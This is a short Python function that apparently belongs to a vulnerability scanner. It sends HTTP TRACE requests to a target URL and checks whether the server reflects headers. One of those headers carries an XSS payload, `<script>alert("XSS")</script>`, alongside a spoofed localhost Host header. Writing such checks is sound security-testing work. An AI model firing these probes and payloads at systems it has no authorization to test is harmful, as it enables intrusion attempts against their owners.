import requests

def Run(url):
    # Target URL

    # Headers for the first TRACE request
    random_headers = {
        'Host': url,
        'Random': 'Header',  # Random header to test reflection
    }

    # Send the first TRACE request
    print("Sending first TRACE request with random headers...")
    response1 = requests.request('TRACE', url, headers=random_headers)

    # Print the response of the first request
    print(f"\nFirst Request Status Code: {response1.status_code}")
    print("First Request Response Text:")
    print(response1.text)

    # Check if the 'Random' header is reflected in the response
    if 'Random' in response1.text:
        print("Reflection of 'Random' header detected in the first request.")
    else:
        print("No reflection of 'Random' header detected in the first request.")

    ### Second Request: TRACE with malicious payload ###

    # Headers for the second TRACE request, with a malicious payload
    malicious_headers = {
        'Host': '127.0.0.1',
        'Attack': '<script>alert("XSS")</script>',  # Malicious XSS payload
    }

    # Send the second TRACE request
    print("\nSending second TRACE request with malicious headers...")
    response2 = requests.request('TRACE', url, headers=malicious_headers)

    # Print the response of the second request
    print(f"\nSecond Request Status Code: {response2.status_code}")
    print("Second Request Response Text:")
    print(response2.text)

    # Check if the 'Attack' header is reflected in the response (XSS check)
    if '<script>alert("XSS")</script>' in response2.text:
        print("Vulnerability confirmed: The server reflected the XSS payload in the second request.")
    else:
        print("No reflection of XSS payload detected in the second request.")
